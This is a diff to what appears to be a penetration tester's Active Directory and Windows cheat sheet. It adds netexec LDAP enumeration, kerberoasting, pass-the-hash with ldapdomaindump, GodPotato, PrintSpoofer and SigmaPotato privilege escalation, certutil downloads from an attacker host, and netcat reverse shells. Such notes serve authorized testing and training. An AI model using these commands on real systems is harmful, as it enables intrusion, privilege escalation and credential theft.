@@ -109,6 +109,7 @@ nxc smb IP -u 'USER' -p 'PASS' --users
 nxc smb IP -u 'USER' -p 'PASS' --groups
 nxc smb IP -u 'USER' -p 'PASS' --loggedon-users
 nxc ldap IP -u 'USER' -p 'PASS' --password-not-required
+nxc ldap IP -u 'USER' -p 'PASS' --users-export users_export.txt
 nxc ldap IP -u 'USER' -p 'PASS' --kerberoasting kerberoast.txt
 nxc ldap IP -u 'USER' -p 'PASS' --asreproast asrep.txt
 # Baseline BloodHound collection
@@ -837,18 +838,20 @@ whoami /priv
 # Check .NET version
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
 # Download GodPotato
-certutil -urlcache -split -f http://192.168.45.235/GodPotato-NET4.exe
+certutil -urlcache -split -f http://IP/GodPotato-NET4.exe
 # Test GodPotato
 .\GodPotato-NET4.exe -cmd "whoami"
 # Get netcat for reverse shell
-certutil -urlcache -split -f http://192.168.45.235/nc.exe
-.\GodPotato-NET4.exe -cmd "nc.exe 192.168.45.235 4444 -e cmd"
+certutil -urlcache -split -f http://IP/nc.exe
+.\GodPotato-NET4.exe -cmd "nc.exe IP 4444 -e cmd"
 
 # PrintSpoofer
+# Especially useful if GodPotato revshell not giving output
 iwr -uri http://IP/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
-.\PrintSpoofer64.exe -i -c "cmd /c cmd.exe"
+.\PrintSpoofer64.exe -i -c "cmd /c \path\to\nc.exe IP 4444 -e cmd"
 
 # SigmaPotato
+.\SigmaPotato.exe --revshell IP PORT
 
 # Mimikatz
 # https://adsecurity.org/?page_id=1821
@@ -1680,6 +1683,7 @@ ldapsearch -H ldap://IP -x -b "DC=DOMAINPREFIX,DC=DOMAINSUFFIX"
 
 ```sh
 ldapdomaindump IP -u 'DOMAIN\USER' -p 'PASSWORD'
+ldapdomaindump IP -u 'DOMAIN\USER' -p 'aad3b435b51404eeaad3b435b51404ee:HASH'
 ```
 
 ##### netexec
@@ -2428,6 +2432,8 @@ Burp plugin and cert
 Copy /usr/share/shells to Downloads for easy access and backup
 
 Install Penelope
+
+Build toolies folder
 
 ```sh
 cd /usr/share/wordlists/
